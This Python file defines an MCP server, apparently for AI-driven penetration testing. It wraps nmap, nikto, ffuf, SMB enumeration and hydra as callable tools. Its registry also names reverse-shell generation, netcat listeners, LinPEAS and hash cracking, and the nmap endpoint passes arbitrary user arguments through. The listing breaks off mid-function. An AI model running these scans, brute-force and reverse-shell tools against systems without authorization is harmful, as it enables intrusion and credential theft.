"""
MCP server for AlienRecon reconnaissance tools.

This server wraps core reconnaissance tools (nmap, nikto, ssl inspection)
and exposes them via the Model Context Protocol.
"""

import asyncio
import json
import logging
import os
import shlex

# Import subprocess for executing real commands
import subprocess
import xml.etree.ElementTree as ET
from datetime import datetime
from typing import Any, Optional

import uvicorn
from fastapi import FastAPI
from pydantic import BaseModel, Field

logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)

app = FastAPI(title="AlienRecon Tools MCP Server")


class ToolRequest(BaseModel):
    """Generic tool request format."""

    tool: str
    parameters: dict[str, Any] = Field(default_factory=dict)


class ToolResponse(BaseModel):
    """Generic tool response format."""

    tool: str
    status: str
    result: Optional[Any] = None
    error: Optional[str] = None
    metadata: dict[str, Any] = Field(default_factory=dict)


# Helper functions for tool execution
def run_command(command: list[str], timeout: int = 300) -> tuple[str, str, int]:
    """Execute a command and return stdout, stderr, and return code."""
    try:
        process = subprocess.Popen(
            command, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True
        )
        stdout, stderr = process.communicate(timeout=timeout)
        return stdout, stderr, process.returncode
    except subprocess.TimeoutExpired:
        process.kill()
        return "", "Command timed out", -1
    except Exception as e:
        return "", str(e), -1


def parse_nmap_xml(xml_output: str) -> dict[str, Any]:
    """Parse nmap XML output into structured data."""
    try:
        root = ET.fromstring(xml_output)
        hosts = []

        for host in root.findall(".//host"):
            host_data = {
                "address": host.find(".//address").get("addr", "unknown"),
                "status": host.find(".//status").get("state", "unknown"),
                "ports": [],
            }

            for port in host.findall(".//port"):
                port_data = {
                    "port": int(port.get("portid", 0)),
                    "protocol": port.get("protocol", "tcp"),
                    "state": port.find(".//state").get("state", "unknown"),
                    "service": port.find(".//service").get("name", "unknown")
                    if port.find(".//service") is not None
                    else "unknown",
                    "version": port.find(".//service").get("version", "")
                    if port.find(".//service") is not None
                    else "",
                }
                if port_data["state"] == "open":
                    host_data["ports"].append(port_data)

            hosts.append(host_data)

        return {"hosts": hosts}
    except Exception as e:
        logger.error(f"Failed to parse nmap XML: {e}")
        return {"error": f"Failed to parse XML: {e}"}


@app.get("/health")
async def health_check():
    """Health check endpoint."""
    return {"status": "healthy", "service": "alienrecon-tools"}


# Tool registry with metadata
TOOL_REGISTRY = {
    # Network Scanning
    "nmap_scan": {
        "name": "nmap_scan",
        "category": "Network Scanning",
        "description": "Network port scanning and service detection",
        "parameters": {
            "target": {
                "type": "string",
                "required": True,
                "description": "IP address or hostname to scan",
            },
            "scan_type": {
                "type": "string",
                "required": False,
                "default": "basic",
                "description": "Scan type: basic, stealth, version, or aggressive",
            },
            "ports": {
                "type": "string",
                "required": False,
                "description": "Port specification (e.g., '22,80,443' or '1-1000')",
            },
            "custom_arguments": {
                "type": "string",
                "required": False,
                "description": "Additional nmap arguments",
            },
        },
    },
    "masscan": {
        "name": "masscan",
        "category": "Network Scanning",
        "description": "Ultra-fast port scanner for large-scale scanning",
        "parameters": {
            "target": {
                "type": "string",
                "required": True,
                "description": "IP address or CIDR range",
            },
            "ports": {
                "type": "string",
                "required": False,
                "default": "1-65535",
                "description": "Port range to scan",
            },
            "rate": {
                "type": "integer",
                "required": False,
                "default": 1000,
                "description": "Packets per second rate",
            },
        },
    },
    "rustscan": {
        "name": "rustscan",
        "category": "Network Scanning",
        "description": "Modern fast port scanner with automatic nmap integration",
        "parameters": {
            "target": {
                "type": "string",
                "required": True,
                "description": "IP address or hostname",
            },
            "ports": {
                "type": "string",
                "required": False,
                "description": "Specific ports to scan",
            },
            "ulimit": {
                "type": "integer",
                "required": False,
                "default": 5000,
                "description": "Ulimit value",
            },
            "batch_size": {
                "type": "integer",
                "required": False,
                "default": 8000,
                "description": "Batch size for scanning",
            },
            "timeout": {
                "type": "integer",
                "required": False,
                "default": 3000,
                "description": "Timeout in milliseconds",
            },
        },
    },
    # Web Vulnerability Scanning
    "nikto_scan": {
        "name": "nikto_scan",
        "category": "Web Vulnerability Scanning",
        "description": "Web server vulnerability scanner",
        "parameters": {
            "target": {
                "type": "string",
                "required": True,
                "description": "Target host or IP",
            },
            "port": {
                "type": "integer",
                "required": False,
                "default": 80,
                "description": "Target port",
            },
            "basic_scan": {
                "type": "boolean",
                "required": False,
                "default": True,
                "description": "Perform basic scan only",
            },
            "tuning": {
                "type": "string",
                "required": False,
                "description": "Tuning options for scan types",
            },
        },
    },
    "wpscan": {
        "name": "wpscan",
        "category": "Web Vulnerability Scanning",
        "description": "WordPress vulnerability scanner",
        "parameters": {
            "target": {
                "type": "string",
                "required": True,
                "description": "WordPress site URL",
            },
            "enumerate": {
                "type": "string",
                "required": False,
                "description": "Enumeration options (e.g., 'u,p,t,tt')",
            },
            "api_token": {
                "type": "string",
                "required": False,
                "description": "WPScan API token for vulnerability data",
            },
        },
    },
    "sqlmap": {
        "name": "sqlmap",
        "category": "Web Vulnerability Scanning",
        "description": "Automatic SQL injection testing tool",
        "parameters": {
            "target": {"type": "string", "required": True, "description": "Target URL"},
            "data": {
                "type": "string",
                "required": False,
                "description": "POST data for testing",
            },
            "method": {
                "type": "string",
                "required": False,
                "description": "HTTP method (GET/POST)",
            },
            "cookie": {
                "type": "string",
                "required": False,
                "description": "Cookie value",
            },
            "level": {
                "type": "integer",
                "required": False,
                "default": 1,
                "description": "Test level (1-5)",
            },
            "risk": {
                "type": "integer",
                "required": False,
                "default": 1,
                "description": "Risk level (1-3)",
            },
        },
    },
    # Directory/Content Discovery
    "ffuf_directory_enumeration": {
        "name": "ffuf_directory_enumeration",
        "category": "Directory/Content Discovery",
        "description": "Fast web fuzzer for directory and file discovery",
        "parameters": {
            "url": {
                "type": "string",
                "required": True,
                "description": "Target URL with FUZZ keyword",
            },
            "wordlist": {
                "type": "string",
                "required": False,
                "description": "Path to wordlist file",
            },
            "extensions": {
                "type": "string",
                "required": False,
                "description": "File extensions to test (e.g., 'php,html,js')",
            },
        },
    },
    "gobuster": {
        "name": "gobuster",
        "category": "Directory/Content Discovery",
        "description": "Directory and file brute-forcing tool",
        "parameters": {
            "url": {"type": "string", "required": True, "description": "Target URL"},
            "wordlist": {
                "type": "string",
                "required": False,
                "description": "Path to wordlist",
            },
            "extensions": {
                "type": "string",
                "required": False,
                "description": "File extensions to append",
            },
            "threads": {
                "type": "integer",
                "required": False,
                "default": 10,
                "description": "Number of threads",
            },
        },
    },
    "feroxbuster": {
        "name": "feroxbuster",
        "category": "Directory/Content Discovery",
        "description": "Fast, recursive content discovery tool written in Rust",
        "parameters": {
            "url": {"type": "string", "required": True, "description": "Target URL"},
            "wordlist": {
                "type": "string",
                "required": False,
                "description": "Path to wordlist",
            },
            "extensions": {
                "type": "string",
                "required": False,
                "description": "File extensions",
            },
            "threads": {
                "type": "integer",
                "required": False,
                "default": 50,
                "description": "Number of threads",
            },
            "status_codes": {
                "type": "string",
                "required": False,
                "default": "200,204,301,302,307,401,403",
                "description": "Status codes to include",
            },
            "recursion_depth": {
                "type": "integer",
                "required": False,
                "default": 4,
                "description": "Recursion depth",
            },
        },
    },
    "wfuzz": {
        "name": "wfuzz",
        "category": "Directory/Content Discovery",
        "description": "Web application fuzzer for parameters, authentication, forms",
        "parameters": {
            "url": {
                "type": "string",
                "required": True,
                "description": "URL with FUZZ keyword where to inject payloads",
            },
            "wordlist": {
                "type": "string",
                "required": False,
                "description": "Wordlist path",
            },
            "hide_codes": {
                "type": "string",
                "required": False,
                "default": "404",
                "description": "Hide responses with these codes",
            },
            "hide_regex": {
                "type": "string",
                "required": False,
                "description": "Hide responses matching regex",
            },
            "threads": {
                "type": "integer",
                "required": False,
                "default": 10,
                "description": "Number of threads",
            },
            "headers": {
                "type": "object",
                "required": False,
                "description": "HTTP headers as key-value pairs",
            },
        },
    },
    "dirsearch": {
        "name": "dirsearch",
        "category": "Directory/Content Discovery",
        "description": "Web path scanner with many features",
        "parameters": {
            "url": {"type": "string", "required": True, "description": "Target URL"},
            "extensions": {
                "type": "string",
                "required": False,
                "default": "php,html,js,txt",
                "description": "Extensions to search",
            },
            "wordlist": {
                "type": "string",
                "required": False,
                "description": "Custom wordlist path",
            },
            "threads": {
                "type": "integer",
                "required": False,
                "default": 20,
                "description": "Number of threads",
            },
            "recursive": {
                "type": "boolean",
                "required": False,
                "default": False,
                "description": "Recursive scanning",
            },
        },
    },
    "ffuf_vhost_discovery": {
        "name": "ffuf_vhost_discovery",
        "category": "Directory/Content Discovery",
        "description": "Virtual host discovery using ffuf",
        "parameters": {
            "url": {"type": "string", "required": True, "description": "Target URL"},
            "wordlist": {
                "type": "string",
                "required": False,
                "description": "Vhost wordlist",
            },
            "domain": {
                "type": "string",
                "required": False,
                "description": "Base domain for vhost discovery",
            },
        },
    },
    # Service Enumeration
    "ssl_certificate_inspection": {
        "name": "ssl_certificate_inspection",
        "category": "Service Enumeration",
        "description": "Inspect SSL/TLS certificates for information",
        "parameters": {
            "target": {
                "type": "string",
                "required": True,
                "description": "Target host",
            },
            "port": {
                "type": "integer",
                "required": False,
                "default": 443,
                "description": "SSL/TLS port",
            },
        },
    },
    "smb_enumeration": {
        "name": "smb_enumeration",
        "category": "Service Enumeration",
        "description": "Enumerate SMB shares and gather information",
        "parameters": {
            "target": {
                "type": "string",
                "required": True,
                "description": "Target IP or hostname",
            },
            "username": {
                "type": "string",
                "required": False,
                "description": "SMB username",
            },
            "password": {
                "type": "string",
                "required": False,
                "description": "SMB password",
            },
        },
    },
    "http_ssl_probe": {
        "name": "http_ssl_probe",
        "category": "Service Enumeration",
        "description": "Probe HTTP/HTTPS services and gather headers",
        "parameters": {
            "target": {
                "type": "string",
                "required": True,
                "description": "Target host",
            },
            "port": {
                "type": "integer",
                "required": False,
                "default": 80,
                "description": "Port to probe",
            },
            "use_ssl": {
                "type": "boolean",
                "required": False,
                "description": "Use SSL/TLS",
            },
        },
    },
    # Exploitation
    "hydra_brute_force": {
        "name": "hydra_brute_force",
        "category": "Exploitation",
        "description": "Password brute-force tool for various services",
        "parameters": {
            "target": {
                "type": "string",
                "required": True,
                "description": "Target host",
            },
            "service": {
                "type": "string",
                "required": True,
                "description": "Service to attack (ssh, ftp, http-post-form, etc.)",
            },
            "username": {
                "type": "string",
                "required": False,
                "description": "Single username or path to username list",
            },
            "password_list": {
                "type": "string",
                "required": False,
                "description": "Path to password list",
            },
        },
    },
    "reverse_shell_generator": {
        "name": "reverse_shell_generator",
        "category": "Exploitation",
        "description": "Generate various reverse shell payloads",
        "parameters": {
            "lhost": {
                "type": "string",
                "required": True,
                "description": "Local host IP for reverse connection",
            },
            "lport": {
                "type": "integer",
                "required": True,
                "description": "Local port for reverse connection",
            },
            "shell_type": {
                "type": "string",
                "required": False,
                "default": "bash",
                "description": "Shell type: bash, python, php, nc, powershell, etc.",
            },
        },
    },
    # Exploit Research
    "searchsploit_query": {
        "name": "searchsploit_query",
        "category": "Exploit Research",
        "description": "Search exploit database for vulnerabilities",
        "parameters": {
            "search_terms": {
                "type": "string",
                "required": True,
                "description": "Search terms (e.g., 'apache 2.4')",
            },
            "strict": {
                "type": "boolean",
                "required": False,
                "default": False,
                "description": "Strict search matching",
            },
        },
    },
    "searchsploit_detail": {
        "name": "searchsploit_detail",
        "category": "Exploit Research",
        "description": "Get detailed information about a specific exploit",
        "parameters": {
            "edb_id": {
                "type": "string",
                "required": True,
                "description": "Exploit DB ID",
            }
        },
    },
    "suggest_exploits_for_services": {
        "name": "suggest_exploits_for_services",
        "category": "Exploit Research",
        "description": "Analyze discovered services and suggest potential exploits",
        "parameters": {
            "services": {
                "type": "array",
                "required": True,
                "description": "List of discovered services with versions",
            }
        },
    },
    # Post-Exploitation
    "python_http_server": {
        "name": "python_http_server",
        "category": "Post-Exploitation",
        "description": "Start a Python HTTP server for file transfers",
        "parameters": {
            "port": {
                "type": "integer",
                "required": False,
                "default": 8000,
                "description": "Server port",
            },
            "directory": {
                "type": "string",
                "required": False,
                "default": ".",
                "description": "Directory to serve",
            },
        },
    },
    "netcat_listener": {
        "name": "netcat_listener",
        "category": "Post-Exploitation",
        "description": "Set up netcat listener for reverse shells",
        "parameters": {
            "port": {
                "type": "integer",
                "required": True,
                "description": "Listening port",
            }
        },
    },
    "linpeas": {
        "name": "linpeas",
        "category": "Post-Exploitation",
        "description": "Download LinPEAS privilege escalation script",
        "parameters": {
            "output_dir": {
                "type": "string",
                "required": False,
                "default": "/tmp",
                "description": "Output directory",
            }
        },
    },
    # Password Cracking
    "hash_identifier": {
        "name": "hash_identifier",
        "category": "Password Cracking",
        "description": "Identify hash types and suggest cracking methods",
        "parameters": {
            "hash": {
                "type": "string",
                "required": True,
                "description": "Hash value to identify",
            }
        },
    },
    "john_the_ripper": {
        "name": "john_the_ripper",
        "category": "Password Cracking",
        "description": "Crack password hashes using John the Ripper",
        "parameters": {
            "hash_file": {
                "type": "string",
                "required": False,
                "description": "File containing hashes",
            },
            "wordlist": {
                "type": "string",
                "required": False,
                "default": "/usr/share/wordlists/rockyou.txt",
                "description": "Wordlist path",
            },
            "format": {
                "type": "string",
                "required": False,
                "description": "Hash format (e.g., md5, sha1, bcrypt)",
            },
            "rules": {
                "type": "string",
                "required": False,
                "description": "Rules to apply (e.g., best64)",
            },
            "show": {
                "type": "boolean",
                "required": False,
                "default": False,
                "description": "Show cracked passwords",
            },
        },
    },
    # Steganography
    "steghide": {
        "name": "steghide",
        "category": "Steganography",
        "description": "Extract hidden data from images",
        "parameters": {
            "image_file": {
                "type": "string",
                "required": True,
                "description": "Path to image file",
            },
            "passphrase": {
                "type": "string",
                "required": False,
                "default": "",
                "description": "Passphrase if encrypted",
            },
            "extract": {
                "type": "boolean",
                "required": False,
                "default": True,
                "description": "Extract data",
            },
            "info": {
                "type": "boolean",
                "required": False,
                "default": False,
                "description": "Show embedded info only",
            },
        },
    },
    "exiftool": {
        "name": "exiftool",
        "category": "Steganography",
        "description": "Extract metadata from files",
        "parameters": {
            "file_path": {
                "type": "string",
                "required": True,
                "description": "Path to file",
            }
        },
    },
    # Utility
    "http_fetch": {
        "name": "http_fetch",
        "category": "Utility",
        "description": "Fetch and analyze web content",
        "parameters": {
            "url": {"type": "string", "required": True, "description": "URL to fetch"},
            "follow_redirects": {
                "type": "boolean",
                "required": False,
                "default": True,
                "description": "Follow HTTP redirects",
            },
        },
    },
    "create_plan": {
        "name": "create_plan",
        "category": "Utility",
        "description": "Create a multi-step reconnaissance plan",
        "parameters": {
            "plan_structure": {
                "type": "object",
                "required": True,
                "description": "Plan structure with steps and conditions",
            }
        },
    },
    "get_plan_status": {
        "name": "get_plan_status",
        "category": "Utility",
        "description": "Check the status of a reconnaissance plan",
        "parameters": {
            "plan_id": {
                "type": "string",
                "required": False,
                "description": "Plan ID to check",
            }
        },
    },
}


@app.get("/tools")
async def list_tools():
    """List all available tools with their metadata."""
    return {
        "tools": TOOL_REGISTRY,
        "total": len(TOOL_REGISTRY),
        "categories": list(set(tool["category"] for tool in TOOL_REGISTRY.values())),
    }


@app.post("/tools/nmap_scan", response_model=ToolResponse)
async def nmap_scan(request: ToolRequest):
    """Execute real nmap scan via MCP."""
    try:
        params = request.parameters
        target = params.get("target")
        scan_type = params.get("scan_type", "basic")
        ports = params.get("ports")
        custom_arguments = params.get("custom_arguments")

        if not target:
            return ToolResponse(
                tool="nmap_scan", status="error", error="Target is required"
            )

        # Build nmap command
        command = ["nmap"]

        # Add scan type flags
        if scan_type == "stealth":
            command.extend(["-sS", "-Pn"])
        elif scan_type == "version":
            command.extend(["-sV", "-Pn"])
        elif scan_type == "aggressive":
            command.extend(["-A", "-Pn"])
        else:  # basic
            command.extend(["-sT", "-Pn"])

        # Add port specification
        if ports:
            command.extend(["-p", ports])
        else:
            command.append("--top-ports=1000")

        # Add XML output
        command.extend(["-oX", "-"])

        # Add custom arguments if provided
        if custom_arguments:
            command.extend(shlex.split(custom_arguments))

        # Add target
        command.append(target)

        logger.info(f"Executing nmap command: {' '.join(command)}")

        # Execute the command
        start_time = datetime.now()
        stdout, stderr, returncode = await asyncio.to_thread(
            run_command, command, timeout=300
        )
        execution_time = (datetime.now() - start_time).total_seconds()

        if returncode != 0:
            return ToolResponse(
                tool="nmap_scan",
                status="error",
                error=f"Nmap failed with return code {returncode}: {stderr}",
            )

        # Parse the XML output
        parsed_data = parse_nmap_xml(stdout)

        # Create a text summary from the parsed data
        summary = _summarize_nmap_results(parsed_data)

        return ToolResponse(
            tool="nmap_scan",
            status="success",
            result={
                "raw_output": stdout,
                "parsed_data": parsed_data,
                "summary": summary,
                "command": " ".join(command),
            },
            metadata={
                "execution_time": execution_time,
                "target": target,
                "scan_type": scan_type,
            },
        )

    except Exception as e:
        logger.error(f"Error in nmap_scan: {e}")
        return ToolResponse(tool="nmap_scan", status="error", error=str(e))


@app.post("/tools/nikto_scan", response_model=ToolResponse)
async def nikto_scan(request: ToolRequest):
    """Execute real nikto scan via MCP."""
    try:
        params = request.parameters
        target = params.get("target")
        port = params.get("port", 80)
        basic_scan = params.get("basic_scan", True)
        tuning = params.get("tuning")

        if not target:
            return ToolResponse(
                tool="nikto_scan", status="error", error="Target is required"
            )

        # Build nikto command
        command = ["nikto"]

        # Add target with proper protocol
        if not target.startswith(("http://", "https://")):
            if port == 443:
                target_url = f"https://{target}"
            else:
                target_url = f"http://{target}"
        else:
            target_url = target

        command.extend(["-h", target_url])

        # Add port if not default
        if port not in [80, 443]:
            command.extend(["-p", str(port)])

        # Add tuning options
        if tuning:
            command.extend(["-Tuning", tuning])
        elif basic_scan:
            # Basic scan - quick checks only
            command.extend(["-Tuning", "1234"])

        # Add JSON output
        command.extend(["-Format", "json", "-o", "-"])

        # No interactive mode
        command.append("-nointeractive")

        logger.info(f"Executing nikto command: {' '.join(command)}")

        # Execute the command
        start_time = datetime.now()
        stdout, stderr, returncode = await asyncio.to_thread(
            run_command,
            command,
            timeout=600,  # 10 minutes for nikto
        )
        execution_time = (datetime.now() - start_time).total_seconds()

        # Parse results
        vulnerabilities = []
        if stdout:
            try:
                # Try to extract vulnerability information from output
                for line in stdout.split("\n"):
                    if "OSVDB" in line or "CVE" in line or "+ /" in line:
                        vulnerabilities.append(line.strip())
            except Exception:
                pass

        # Create summary
        summary = {
            "target": target_url,
            "port": port,
            "vulnerabilities_found": len(vulnerabilities),
            "scan_type": "basic" if basic_scan else "full",
        }

        return ToolResponse(
            tool="nikto_scan",
            status="success",
            result={
                "raw_output": stdout,
                "vulnerabilities": vulnerabilities[:50],  # Limit to first 50
                "summary": summary,
                "command": " ".join(command),
            },
            metadata={"execution_time": execution_time, "target": target, "port": port},
        )

    except Exception as e:
        logger.error(f"Error in nikto_scan: {e}")
        return ToolResponse(tool="nikto_scan", status="error", error=str(e))


@app.post("/tools/ssl_certificate_inspection", response_model=ToolResponse)
async def ssl_certificate_inspection(request: ToolRequest):
    """Inspect SSL certificate via MCP."""
    try:
        params = request.parameters
        target = params.get("target")
        port = params.get("port", 443)

        if not target:
            return ToolResponse(
                tool="ssl_certificate_inspection",
                status="error",
                error="Target is required",
            )

        # Use openssl s_client to get certificate info
        command = [
            "timeout",
            "10",  # 10 second timeout
            "openssl",
            "s_client",
            "-connect",
            f"{target}:{port}",
            "-servername",
            target,
            "-showcerts",
        ]

        logger.info(f"Executing SSL inspection: {' '.join(command)}")

        # Execute the command
        start_time = datetime.now()
        stdout, stderr, returncode = await asyncio.to_thread(
            run_command, command, timeout=15
        )
        execution_time = (datetime.now() - start_time).total_seconds()

        # Parse certificate information
        cert_info = _parse_ssl_certificate(stdout + stderr)

        return ToolResponse(
            tool="ssl_certificate_inspection",
            status="success",
            result={
                "raw_output": stdout + stderr,
                "certificate_info": cert_info,
                "command": " ".join(command),
            },
            metadata={"execution_time": execution_time, "target": target, "port": port},
        )

    except Exception as e:
        logger.error(f"Error in ssl_certificate_inspection: {e}")
        return ToolResponse(
            tool="ssl_certificate_inspection", status="error", error=str(e)
        )


@app.post("/tools/http_ssl_probe", response_model=ToolResponse)
async def http_ssl_probe(request: ToolRequest):
    """Probe HTTP/HTTPS service via MCP."""
    try:
        params = request.parameters
        target = params.get("target")
        port = params.get("port", 443)

        if not target:
            return ToolResponse(
                tool="http_ssl_probe", status="error", error="Target is required"
            )

        results = {}

        # Try HTTPS first
        https_url = f"https://{target}:{port}"
        https_command = [
            "curl",
            "-I",  # HEAD request
            "-k",  # Allow insecure SSL
            "-L",  # Follow redirects
            "-s",  # Silent
            "-S",  # Show errors
            "-m",
            "10",  # 10 second timeout
            https_url,
        ]

        logger.info(f"Probing HTTPS: {https_url}")
        stdout, stderr, returncode = await asyncio.to_thread(
            run_command, https_command, timeout=15
        )

        if returncode == 0 and stdout:
            results["https"] = {"available": True, "headers": stdout, "url": https_url}
        else:
            results["https"] = {
                "available": False,
                "error": stderr or "Connection failed",
            }

        # Try HTTP
        http_url = f"http://{target}:{port}"
        http_command = [
            "curl",
            "-I",  # HEAD request
            "-L",  # Follow redirects
            "-s",  # Silent
            "-S",  # Show errors
            "-m",
            "10",  # 10 second timeout
            http_url,
        ]

        logger.info(f"Probing HTTP: {http_url}")
        stdout, stderr, returncode = await asyncio.to_thread(
            run_command, http_command, timeout=15
        )

        if returncode == 0 and stdout:
            results["http"] = {"available": True, "headers": stdout, "url": http_url}
        else:
            results["http"] = {
                "available": False,
                "error": stderr or "Connection failed",
            }

        # Parse headers for useful info
        summary = _summarize_http_probe(results)

        return ToolResponse(
            tool="http_ssl_probe",
            status="success",
            result={"protocols": results, "summary": summary},
            metadata={"target": target, "port": port},
        )

    except Exception as e:
        logger.error(f"Error in http_ssl_probe: {e}")
        return ToolResponse(tool="http_ssl_probe", status="error", error=str(e))


def _summarize_nmap_results(data: dict[str, Any]) -> dict[str, Any]:
    """Create a summary of nmap results."""
    if not data:
        return {}

    summary = {
        "total_hosts": len(data.get("hosts", [])),
        "hosts_up": sum(1 for h in data.get("hosts", []) if h.get("status") == "up"),
        "total_open_ports": 0,
        "services": [],
    }

    for host in data.get("hosts", []):
        for port_info in host.get("ports", []):
            if port_info.get("state") == "open":
                summary["total_open_ports"] += 1
                service = f"{port_info.get('port')}/{port_info.get('protocol')} - {port_info.get('service', 'unknown')}"
                if service not in summary["services"]:
                    summary["services"].append(service)

    return summary


def _parse_ssl_certificate(output: str) -> dict[str, Any]:
    """Parse SSL certificate information from openssl output."""
    cert_info = {
        "subject": None,
        "issuer": None,
        "validity": {},
        "san": [],
        "cipher": None,
        "protocol": None,
    }

    try:
        # Extract subject
        if "subject=" in output:
            subject_line = [
                line
                for line in output.split("\n")
                if line.strip().startswith("subject=")
            ]
            if subject_line:
                cert_info["subject"] = subject_line[0].split("subject=", 1)[1].strip()

        # Extract issuer
        if "issuer=" in output:
            issuer_line = [
                line
                for line in output.split("\n")
                if line.strip().startswith("issuer=")
            ]
            if issuer_line:
                cert_info["issuer"] = issuer_line[0].split("issuer=", 1)[1].strip()

        # Extract validity dates
        if "notBefore=" in output:
            before_line = [line for line in output.split("\n") if "notBefore=" in line]
            if before_line:
                cert_info["validity"]["not_before"] = (
                    before_line[0].split("notBefore=", 1)[1].strip()
                )

        if "notAfter=" in output:
            after_line = [line for line in output.split("\n") if "notAfter=" in line]
            if after_line:
                cert_info["validity"]["not_after"] = (
                    after_line[0].split("notAfter=", 1)[1].strip()
                )

        # Extract cipher and protocol
        if "Cipher    :" in output:
            cipher_line = [line for line in output.split("\n") if "Cipher    :" in line]
            if cipher_line:
                cert_info["cipher"] = cipher_line[0].split(":", 1)[1].strip()

        if "Protocol  :" in output:
            protocol_line = [
                line for line in output.split("\n") if "Protocol  :" in line
            ]
            if protocol_line:
                cert_info["protocol"] = protocol_line[0].split(":", 1)[1].strip()

    except Exception as e:
        logger.error(f"Error parsing SSL certificate: {e}")

    return cert_info


def _summarize_http_probe(results: dict[str, Any]) -> dict[str, Any]:
    """Summarize HTTP/HTTPS probe results."""
    summary = {
        "protocols_available": [],
        "redirects": [],
        "server": None,
        "interesting_headers": {},
    }

    for protocol, data in results.items():
        if data.get("available"):
            summary["protocols_available"].append(protocol.upper())

            headers = data.get("headers", "")
            # Extract server header
            if "Server:" in headers and not summary["server"]:
                server_line = [
                    line for line in headers.split("\n") if line.startswith("Server:")
                ]
                if server_line:
                    summary["server"] = server_line[0].split(":", 1)[1].strip()

            # Check for redirects
            if "Location:" in headers:
                location_line = [
                    line for line in headers.split("\n") if line.startswith("Location:")
                ]
                if location_line:
                    redirect = location_line[0].split(":", 1)[1].strip()
                    summary["redirects"].append(
                        {"from": data.get("url"), "to": redirect}
                    )

            # Extract interesting security headers
            security_headers = [
                "X-Frame-Options",
                "X-Content-Type-Options",
                "Strict-Transport-Security",
                "Content-Security-Policy",
                "X-XSS-Protection",
            ]

            for header in security_headers:
                header_line = [
                    line
                    for line in headers.split("\n")
                    if line.lower().startswith(header.lower() + ":")
                ]
                if header_line:
                    summary["interesting_headers"][header] = (
                        header_line[0].split(":", 1)[1].strip()
                    )

    return summary


# ===== FFUF Web Fuzzing Tools =====


@app.post("/tools/ffuf_directory_enumeration", response_model=ToolResponse)
async def ffuf_directory_enumeration(request: ToolRequest):
    """Execute real directory enumeration using ffuf."""
    try:
        params = request.parameters
        url = params.get("url")
        wordlist = params.get("wordlist", "/usr/share/wordlists/dirb/common.txt")
        extensions = params.get("extensions")
        threads = params.get("threads", 40)

        if not url:
            return ToolResponse(
                tool="ffuf_directory_enumeration",
                status="error",
                error="URL is required",
            )

        # Build ffuf command
        command = [
            "ffuf",
            "-u",
            f"{url}/FUZZ",
            "-w",
            wordlist,
            "-t",
            str(threads),
            "-fc",
            "404",
            "-o",
            "-",
            "-of",
            "json",
        ]

        if extensions:
            command.extend(["-e", extensions])

        logger.info(f"Executing ffuf command: {' '.join(command)}")

        # Execute the command
        stdout, stderr, returncode = await asyncio.to_thread(
            run_command, command, timeout=600
        )

        # Parse results
        findings = []
        if stdout:
            try:
                data = json.loads(stdout)
                for result in data.get("results", []):
                    findings.append(
                        {
                            "url": result.get("url"),
                            "status": result.get("status"),
                            "length": result.get("length"),
                            "words": result.get("words"),
                        }
                    )
            except json.JSONDecodeError:
                pass

        return ToolResponse(
            tool="ffuf_directory_enumeration",
            status="success",
            result={
                "findings": findings[:100],  # Limit results
                "total_found": len(findings),
                "command": " ".join(command),
            },
            metadata={"url": url, "wordlist": wordlist},
        )

    except Exception as e:
        logger.error(f"Error in ffuf_directory_enumeration: {e}")
        return ToolResponse(
            tool="ffuf_directory_enumeration", status="error", error=str(e)
        )


@app.post("/tools/ffuf_vhost_discovery", response_model=ToolResponse)
async def ffuf_vhost_discovery(request: ToolRequest):
    """Execute virtual host discovery using ffuf."""
    try:
        params = request.parameters
        ip = params.get("ip")
        domain = params.get("domain")
        wordlist = params.get(
            "wordlist",
            "/usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt",
        )

        if not ip or not domain:
            return ToolResponse(
                tool="ffuf_vhost_discovery",
                status="error",
                error="Both IP and domain are required",
            )

        # Build ffuf command
        command = [
            "ffuf",
            "-u",
            f"http://{ip}",
            "-H",
            f"Host: FUZZ.{domain}",
            "-w",
            wordlist,
            "-fc",
            "404,403",
            "-o",
            "-",
            "-of",
            "json",
        ]

        logger.info(f"Executing ffuf vhost command: {' '.join(command)}")

        # Execute the command
        stdout, stderr, returncode = await asyncio.to_thread(
            run_command, command, timeout=600
        )

        # Parse results
        vhosts = []
        if stdout:
            try:
                data = json.loads(stdout)
                for result in data.get("results", []):
                    vhosts.append(
                        {
                            "host": result.get("host"),
                            "status": result.get("status"),
                            "length": result.get("length"),
                        }
                    )
            except json.JSONDecodeError:
                pass

        return ToolResponse(
            tool="ffuf_vhost_discovery",
            status="success",
            result={
                "vhosts": vhosts,
                "total_found": len(vhosts),
                "command": " ".join(command),
            },
            metadata={"ip": ip, "domain": domain},
        )

    except Exception as e:
        logger.error(f"Error in ffuf_vhost_discovery: {e}")
        return ToolResponse(tool="ffuf_vhost_discovery", status="error", error=str(e))


# ===== Service Enumeration Tools =====


@app.post("/tools/smb_enumeration", response_model=ToolResponse)
async def smb_enumeration(request: ToolRequest):
    """Execute SMB enumeration using enum4linux-ng."""
    try:
        params = request.parameters
        target = params.get("target")
        username = params.get("username")
        password = params.get("password")

        if not target:
            return ToolResponse(
                tool="smb_enumeration", status="error", error="Target is required"
            )

        # Build enum4linux-ng command
        command = ["enum4linux-ng", "-A", target]

        if username and password:
            command.extend(["-u", username, "-p", password])

        logger.info(f"Executing enum4linux-ng command: {' '.join(command)}")

        # Execute the command
        stdout, stderr, returncode = await asyncio.to_thread(
            run_command, command, timeout=300
        )

        # Parse key findings
        findings = {"shares": [], "users": [], "groups": [], "os_info": ""}

        if stdout:
            lines = stdout.split("\n")
            in_shares = False
            in_users = False

            for line in lines:
                if "Sharename" in line:
                    in_shares = True
                elif "Username" in line:
                    in_users = True
                elif in_shares and line.strip() and not line.startswith("---"):
                    parts = line.split()
                    if len(parts) >= 2:
                        findings["shares"].append(parts[0])
                elif in_users and line.strip() and not line.startswith("---"):
                    parts = line.split()
                    if len(parts) >= 1:
                        findings["users"].append(parts[0])
                elif "OS:" in line:
                    findings["os_info"] = line.split("OS:", 1)[1].strip()

        return ToolResponse(
            tool="smb_enumeration",
            status="success",
            result={
                "raw_output": stdout[:10000],  # Limit output
                "findings": findings,
                "command": " ".join(command),
            },
            metadata={"target": target, "authenticated": bool(username and password)},
        )

    except Exception as e:
        logger.error(f"Error in smb_enumeration: {e}")
        return ToolResponse(tool="smb_enumeration", status="error", error=str(e))


@app.post("/tools/hydra_brute_force", response_model=ToolResponse)
async def hydra_brute_force(request: ToolRequest):
    """Execute password brute-forcing using Hydra."""
    try:
        params = request.parameters
        target = params.get("target")
        service = params.get("service")
        username = params.get("username")
